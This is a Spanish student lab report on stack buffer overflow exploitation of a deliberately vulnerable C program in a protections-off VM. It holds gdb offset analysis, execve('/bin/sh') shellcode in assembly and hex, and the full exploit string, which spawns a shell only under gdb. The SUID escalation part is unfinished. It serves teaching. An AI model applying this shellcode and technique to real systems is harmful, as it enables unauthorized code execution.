<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>-</title>
  <style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}

ul.task-list[class]{list-style: none;}
ul.task-list li input[type="checkbox"] {
font-size: inherit;
width: 0.8em;
margin: 0 0.8em 0.2em -1.6em;
vertical-align: middle;
}
</style>
  <style type="text/css">@font-face {
font-family: fira-sans;
src: local("FiraSans-Regular");
}
@font-face {
font-family: fira-mono;
src: local("FiraMono-Regular");
}
@font-face {
font-family: color-emoji;
src: local("Noto Color Emoji"), local("Apple Color Emoji"), local("Segoe UI Emoji"), local("Segoe UI Symbol");
}
:root {
--text-color: #24292e;
--background-color: #ffffff;
--alt-background-color: #f6f8fa;
--link-color: #0366d6;
--blockquote-text-color: #6a737d;
--blockquote-border-color: #dfe2e5;
--header-border-color: #eaecef;
--hr-background-color: #e1e4e8;
--table-tr-border-color: #c6cbd1;
--table-td-border-color: #dfe2e5;
--kbd-text-color: #444d56;
--kbd-background-color: #fafbfc;
--kbd-border-color: #c6cbd1;
--kbd-shadow-color: #959da5;
}
* {
box-sizing: border-box;
}
html {
font-size: 16px;
}
body {
color: var(--text-color);
background-color: var(--background-color);
font-family: "Fira Sans", fira-sans, sans-serif, color-emoji;
line-height: 1.5;
word-wrap: break-word;
max-width: 980px;
margin: auto;
margin-top: 60px;
padding: 4em;
}
@media screen and (max-width: 799px) {
html {
font-size: 14px;
}
body {
padding: 1em;
}
}
@media screen and (min-width: 1280px) {
html {
font-size: 18px;
}
}
a {
background-color: transparent;
color: var(--link-color);
text-decoration: none;
}
a:active,
a:hover {
outline-width: 0;
}
a:hover {
text-decoration: underline;
}
strong {
font-weight: bold;
}
img {
border-style: none;
}
hr {
box-sizing: content-box;
height: 0.25em;
padding: 0;
margin: 1.5em 0;
overflow: hidden;
background-color: var(--hr-background-color);
border: 0;
}
hr::before {
display: table;
content: "";
}
hr::after {
display: table;
clear: both;
content: "";
}
input {
font-family: inherit;
font-size: inherit;
line-height: inherit;
margin: 0;
overflow: visible;
}
[type="checkbox"] {
box-sizing: border-box;
padding: 0;
}
table {
border-spacing: 0;
border-collapse: collapse;
}
td,
th {
padding: 0;
}
h1,
h2,
h3,
h4,
h5,
h6 {
font-weight: bold;
margin: 0;
}
h1 {
font-size: 2em;
}
h2 {
font-size: 1.5em;
}
h3 {
font-size: 1.25em;
}
h4 {
font-size: 1em;
}
h5 {
font-size: 0.875em;
}
h6 {
font-size: 0.85em;
}
p {
margin-top: 0;
margin-bottom: 0.625em;
}
blockquote {
margin: 0;
}
ul,
ol {
padding-left: 0;
margin-top: 0;
margin-bottom: 0;
}
ol ol,
ul ol {
list-style-type: lower-roman;
}
ul ul ol,
ul ol ol,
ol ul ol,
ol ol ol {
list-style-type: lower-alpha;
}
dd {
margin-left: 0;
}
code,
kbd,
pre {
font-family: "Fira Mono", fira-mono, monospace, color-emoji;
font-size: 1em;
word-wrap: normal;
}
code {
border-radius: 0.1875em;
font-size: 0.85em;
padding: 0.2em 0.4em;
margin: 0;
}
pre {
margin-top: 0;
margin-bottom: 0;
font-size: 0.75em;
}
pre>code {
padding: 0;
margin: 0;
font-size: 1em;
word-break: normal;
white-space: pre;
background: transparent;
border: 0;
}
.highlight {
margin-bottom: 1em;
}
.highlight pre {
margin-bottom: 0;
word-break: normal;
}
.highlight pre,
pre {
padding: 1em;
overflow: auto;
font-size: 0.85em;
line-height: 1.5;
background-color: var(--alt-background-color);
border-radius: 0.1875em;
}
pre code {
background-color: transparent;
border: 0;
display: inline;
padding: 0;
margin: 0;
overflow: visible;
line-height: inherit;
word-wrap: normal;
}
.pl-0 {
padding-left: 0 !important;
}
.pl-1 {
padding-left: 0.25em !important;
}
.pl-2 {
padding-left: 0.5em !important;
}
.pl-3 {
padding-left: 1em !important;
}
.pl-4 {
padding-left: 1.5em !important;
}
.pl-5 {
padding-left: 2em !important;
}
.pl-6 {
padding-left: 2.5em !important;
}
.markdown-body::before {
display: table;
content: "";
}
.markdown-body::after {
display: table;
clear: both;
content: "";
}
.markdown-body>*:first-child {
margin-top: 0 !important;
}
.markdown-body>*:last-child {
margin-bottom: 0 !important;
}
a:not([href]) {
color: inherit;
text-decoration: none;
}
.anchor {
float: left;
padding-right: 0.25em;
margin-left: -1.25em;
line-height: 1;
}
.anchor:focus {
outline: none;
}
p,
blockquote,
ul,
ol,
dl,
table,
pre {
margin-top: 0;
margin-bottom: 1em;
}
blockquote {
padding: 0 1em;
color: var(--blockquote-text-color);
border-left: 0.25em solid var(--blockquote-border-color);
}
blockquote>:first-child {
margin-top: 0;
}
blockquote>:last-child {
margin-bottom: 0;
}
kbd {
display: inline-block;
padding: 0.1875em 0.3125em;
font-size: 0.6875em;
line-height: 1;
color: var(--kbd-text-color);
vertical-align: middle;
background-color: var(--kbd-background-color);
border: solid 1px var(--kbd-border-color);
border-bottom-color: var(--kbd-shadow-color);
border-radius: 3px;
box-shadow: inset 0 -1px 0 var(--kbd-shadow-color);;
}
h1,
h2,
h3,
h4,
h5,
h6 {
margin-top: 1.5em;
margin-bottom: 1em;
font-weight: bold;
line-height: 1.25;
}
h1:hover .anchor,
h2:hover .anchor,
h3:hover .anchor,
h4:hover .anchor,
h5:hover .anchor,
h6:hover .anchor {
text-decoration: none;
}
h1 {
padding-bottom: 0.3em;
font-size: 2em;
border-bottom: 1px solid var(--header-border-color);
}
h2 {
padding-bottom: 0.3em;
font-size: 1.5em;
border-bottom: 1px solid var(--header-border-color);
}
h3 {
font-size: 1.25em;
}
h4 {
font-size: 1em;
}
h5 {
font-size: 0.875em;
}
h6 {
font-size: 0.85em;
opacity: 0.67;
}
ul,
ol {
padding-left: 2em;
}
ul ul,
ul ol,
ol ol,
ol ul {
margin-top: 0;
margin-bottom: 0;
}
li {
overflow-wrap: break-word;
}
li>p {
margin-top: 1em;
}
li+li {
margin-top: 0.25em;
}
dl {
padding: 0;
}
dl dt {
padding: 0;
margin-top: 1em;
font-size: 1em;
font-style: italic;
font-weight: bold;
}
dl dd {
padding: 0 1em;
margin-bottom: 1em;
}
table {
display: block;
width: 100%;
overflow: auto;
}
table th {
font-weight: bold;
}
table th,
table td {
padding: 0.375em 0.8125em;
border: 1px solid var(--table-td-border-color);
}
table tr {
background-color: var(--background-color);
border-top: 1px solid var(--table-tr-border-color);
}
table tr:nth-child(2n) {
background-color: var(--alt-background-color);
}
img {
max-width: 100%;
box-sizing: content-box;
}
img[align=right] {
padding-left: 1.25em;
}
img[align=left] {
padding-right: 1.25em;
}
.task-list-item {
list-style-type: none;
}
.task-list-item+.task-list-item {
margin-top: 0.1875em;
}
.task-list-item input {
margin: 0 0.2em 0.25em -1.6em;
vertical-align: middle;
}
:root {
--text-color: rgba(0, 0, 0, 0.8);
--background-color: #f5f5f5;
--alt-background-color: #eeeeee;
--link-color: #0d71de;
--blockquote-text-color: #747e85;
--blockquote-border-color: #d6d8da;
--header-border-color: #e1e2e4;
--hr-background-color: #d8dadd;
--table-tr-border-color: #bdc1c6;
--table-td-border-color: #d6d8da;
--kbd-text-color: #4e585e;
--kbd-background-color: #f1f1f1;
--kbd-border-color: #bdc1c6;
--kbd-shadow-color: #8c939a;
}
@media (prefers-color-scheme: dark) {
:root {
--text-color: #eeeeee;
--background-color: #282828;
--alt-background-color: #3a3a3a;
--link-color: #b5daff;
--blockquote-text-color: #a8a8a6;
--blockquote-border-color: #525252;
--header-border-color: #474747;
--hr-background-color: #505050;
--table-tr-border-color: #696969;
--table-td-border-color: #525252;
--kbd-text-color: #cececc;
--kbd-background-color: #3c3c3c;
--kbd-border-color: #696969;
--kbd-shadow-color: #979797;
}
}
</style>
</head>
<body>
<h1 id="práctica-explotación-mediante-buffer-overflows">Práctica: Explotación mediante buffer overflows</h1>
<h2 id="martín-jiménez-guerra">Martín Jiménez Guerra</h2>
<h3 id="parte-1-diseño-de-un-exploit-para-ejecutar-una-shell-local">Parte 1: Diseño de un exploit para ejecutar una shell local</h3>
<p>En esta primera parte se nos proporciona el siguiente programa vulnerable (vuln.c):</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string .h&gt;

void function (char *input) {
    char buffer[64];
    strcpy (buffer, input);
}

int main(int argc, char *argv[]) {
    if (argc &gt; 1) {
        function(argv[1]);
    }
    else {
        printf(&quot;Usage: %s &lt;input&gt;\ n&quot;, argv [0]);
    }
    return(0);
}</code></pre>
<p>Compilamos el codigo haciendo que la pila sea ejecutable y desactivando sus protecciones. Añadimos tambíen el flag -g, que facilitara el uso del programa en gdb.</p>
<pre><code>gcc -z execstack vuln.c -fno-stack-protector -o vuln -g</code></pre>
<p>Además, desactivamos ASLR (Address space layout randomization) para asegurarnos de que el programa se va ejecutar empezando siempre en la misma dirección. Gracias a esto, la dirección de retorno que tenemos que sobreescribir sera siempre la misma.</p>
<pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
<p>La vulnerabilidad reside en la función function, ya que usa strcpy para copiar el input en un buffer, sin comprobar su tamaño. Esto nos permite desbordar el buffer, sobreescribir la dirección de retorno y asi modificar el flujo del programa.</p>
<p>Aqui podemos ver como desbordamos el buffer, causando un &#39;Segmentation Fault&#39; al estar redirigiendo el programa a una dirección que reside fuera del espacio del programa.</p>
<pre><code>user@vbox:~/uorkspace/practica2$ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault</code></pre>
<p>Vamos a empezar a diseñar el exploit. Para ello cargamos el programa vuln el gdb.</p>
<pre><code>gdb -q ./vuln</code></pre>
<p>Comprobamos cuantos elementos tenemos que introducir en el buffer para sobreescribir la dirección de retorno.</p>
<pre><code>Reading symbols from ./vuln...
(gdb) b function 
Breakpoint 1 at 0x1155: file vuln.c, line 6.
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBCCCCCCCC
Starting program: /home/user/uorkspace/practica2/vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBCCCCCCCC
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
Breakpoint 1, function (input=0x7fffffffe640 &#39;A&#39; &lt;repeats 69 times&gt;, &quot;BBBBBBCCCCCCCC&quot;) at vuln.c:6
6       strcpy(buffer , input);
(gdb) disassemble function
Dump of assembler code for function function:
   0x0000555555555149 &lt;+0&gt;: push   %rbp
   0x000055555555514a &lt;+1&gt;: mov    %rsp,%rbp
   0x000055555555514d &lt;+4&gt;: sub    $0x50,%rsp
   0x0000555555555151 &lt;+8&gt;: mov    %rdi,-0x48(%rbp)
=&gt; 0x0000555555555155 &lt;+12&gt;:    mov    -0x48(%rbp),%rdx
   0x0000555555555159 &lt;+16&gt;:    lea    -0x40(%rbp),%rax
   0x000055555555515d &lt;+20&gt;:    mov    %rdx,%rsi
   0x0000555555555160 &lt;+23&gt;:    mov    %rax,%rdi
   0x0000555555555163 &lt;+26&gt;:    call   0x555555555030 &lt;strcpy@plt&gt;
   0x0000555555555168 &lt;+31&gt;:    nop
   0x0000555555555169 &lt;+32&gt;:    leave
   0x000055555555516a &lt;+33&gt;:    ret
End of assembler dump.
(gdb) b *0x000055555555516a
Breakpoint 2 at 0x55555555516a: file vuln.c, line 7.
(gdb) i frame
Stack level 0, frame at 0x7fffffffe270:
 rip = 0x555555555155 in function (vuln.c:6); saved rip = 0x555555555193
 called by frame at 0x7fffffffe290
 source language c.
 Arglist at 0x7fffffffe260, args: input=0x7fffffffe640 &#39;A&#39; &lt;repeats 69 times&gt;, &quot;BBBBBBCCCCCCCC&quot;
 Locals at 0x7fffffffe260, Previous frame&#39;s sp is 0x7fffffffe270
 Saved registers:
  rbp at 0x7fffffffe260, rip at 0x7fffffffe268
(gdb) c
Continuing.
Breakpoint 2, 0x000055555555516a in function (
    input=0x7fffffffe640 &#39;A&#39; &lt;repeats 69 times&gt;, &quot;BBBBBBCCCCCCCC&quot;) at vuln.c:7
7   }
(gdb) i frame
Stack level 0, frame at 0x7fffffffe270:
 rip = 0x55555555516a in function (vuln.c:7); saved rip = 0x4343434343424242
 called by frame at 0x7fffffffe278
 source language c.
 Arglist at 0x4242424141414141, args: input=0x7fffffffe640 &#39;A&#39; &lt;repeats 69 times&gt;, &quot;BBBBBBCCCCCCCC&quot;
 Locals at 0x4242424141414141, Previous frame&#39;s sp is 0x7fffffffe270
 Saved registers:
  rbp at 0x7fffffffe260, rip at 0x7fffffffe268</code></pre>
<p>Podemos observar que después de ejecutar strcpy, la dirección de retorno ha sido modificada a &#39;0x4343434343424242&#39;.</p>
<pre><code>saved rip = 0x4343434343424242</code></pre>
<p>Con ello, sabemos que el exploit tiene que tener la siguiente forma:</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBDIRECCCIÓN</code></pre>
<p>Como vamos a meter el shellcode en el buffer, la nueva dirección de retorno tiene que ser la dirección del propio buffer.</p>
<pre><code>(gdb) print &amp;buffer
$1 = (char (*)[64]) 0x7fffffffe220</code></pre>
<p>El shellcode que voy a usar es el siguiente:</p>
<pre><code>section .text
    global _start
_start:
    xor rdx, rdx              ; envp = NULL (sin \x00)
    push rdx                  ; NULL en la pila
    mov rbx, 0x68732f6e69622f2f  ; &quot;//bin/sh&quot;
    shr rbx, 8                ; Desplazar para evitar \x00
    push rbx                  ; Poner &quot;/bin/sh&quot; en la pila
    mov rdi, rsp              ; Apuntar RDI a &quot;/bin/sh&quot;
    push rdx                  ; NULL (argv[1] = NULL)
    push rdi                  ; Poner dirección de &quot;/bin/sh&quot;en la pila (argv[0])
    mov rsi, rsp              ; RSI apunta a argv
    xor rax, rax
    mov al, 59                ; execve syscall (0x3b)
    syscall                   ; Llamar a execve
    xor edi, edi              ; exit(0) sin \x00
    mov al, 60                ; exit syscall (0x3c)
    syscall</code></pre>
<p>Tras muchas horas de experimentacíon me he dado cuenta de que deberia haber invertido más tiempo en desarrollar el shellcode, ya que aunque sea funcional, trae varios problemas. Por desgracia, no me da tiempo.</p>
<p>La representación hexadecimal es:</p>
<pre><code>\x48\x31\xd2\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05\x31\xff\xb0\x3c\x0f\x05</code></pre>
<p>Creamos el exploit:</p>
<pre><code>\x48\x31\xd2\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05\x31\xff\xb0\x3c\x0f\x05AAAAAAAAAAAAAAAAAAAAAABBBBBBBBCC\x30\xe2\xff\xff\xff\x7f</code></pre>
<p>Lo guardamos en el fichero exploit2.txt y lo ejecutamos desde gdb.</p>
<pre><code>user@vbox:~/uorkspace/practica2$ gdb -q ./vuln
Reading symbols from ./vuln...
(gdb) run $(echo -e $(cat exploit2.txt))
Starting program: /home/user/uorkspace/practica2/vuln $(echo -e $(cat exploit2.txt))
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
process 1554 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
$ </code></pre>
<p>Como podemos ver, hemos obtenido una shell. Desgraciadamente, no ocurre lo mismo si lo ejecutamos fuera de gdb:</p>
<pre><code>user@vbox:~/uorkspace/practica2$ ./vuln $(echo -e $(cat exploit2.txt))
Illegal instruction</code></pre>
<p>Esto ocurre porque gdb carga varias variables de entorno, haciendo que la direccion de retorno sea diferente.</p>
<p>Esto se puede solucionar añadiendo NOP&#39;s al principio para tener un area en la que la ejecucion del programa pueda &#39;caer&#39;.</p>
<p>Me he encontrado con varios problemas a la hora de hacer esto, ya que los push de mi shellcode barata se comian el codigo que se tenia que ejecutar antes de llamar a la syscall.</p>
<p>Me encantaria comentar posibles soluciones con las que he jugado, pero desgraciadamente, no me da tiempo.</p>
<h3 id="parte-2-explotación-con-suid-y-escalada-de-privilegios">Parte 2: Explotación con SUID y escalada de privilegios:</h3>
<p>Naturalmente tampoco he tenido tiempo de hacer la segunda parte, pero a mi enternder es añadir dos syscalls al shellcode para hacer setuid(geteuid())).</p>
<p>Ahora, voy a intentar entregar este documento a tiempo.</p>
</body>
</html>
